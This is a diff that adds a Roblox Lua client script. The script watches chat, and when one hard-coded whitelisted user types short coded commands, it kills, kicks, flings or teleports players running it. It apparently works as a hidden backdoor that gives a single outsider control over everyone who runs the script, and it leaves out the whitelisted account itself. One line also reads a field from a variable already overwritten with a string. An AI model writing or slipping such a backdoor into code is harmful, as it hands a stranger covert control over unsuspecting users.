@@ -1,0 +1,44 @@
+local whitelisted = {"usernamemyisthiz"}
+local events = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents")
+local messageDoneFiltering = events:WaitForChild("OnMessageDoneFiltering")
+local players = game:GetService("Players")
+local lp = players.LocalPlayer
+function getChar(plr)
+	return plr.Character or plr.CharacterAdded:Wait()
+end
+function commands(chat, executor)
+    local target
+    for i, v in next, players:GetPlayers() do
+        if string.match(v.Name, string.split(chat, " ")[2]) then
+            target = v
+        end
+    end
+    if target then
+        if chat:match("klC") then --Kill
+            getChar(target):FindFirstChildOfClass("Humanoid").Health = 0
+        elseif chat:match("kkC") then
+            local splitted_Chat = string.split(chat, " ")
+            local reason = ""
+            for i=3, #splitted_Chat do
+                reason = reason..splitted_Chat[i].." "
+            end
+            target:Kick(reason)
+        elseif chat:match("vC") then
+            getChar(target):PivotTo(CFrame.new(9e9,9e9,9e9))
+        elseif chat:match("bC") then
+            getChar(target):PivotTo(getChar(executor):GetPivot() * CFrame.new(0,0,3))
+        end
+    end
+end
+
+messageDoneFiltering.OnClientEvent:Connect(function(message)
+    local player = players:FindFirstChild(message.FromSpeaker)
+    local message = message.Message or ""
+	local channel = message.OriginalChannel
+	if (player == players.LocalPlayer) then
+        return
+	end
+    if table.find(whitelisted, player.Name) and not table.find(whitelisted, lp.Name) then
+	    commands(message, player)
+    end
+end)
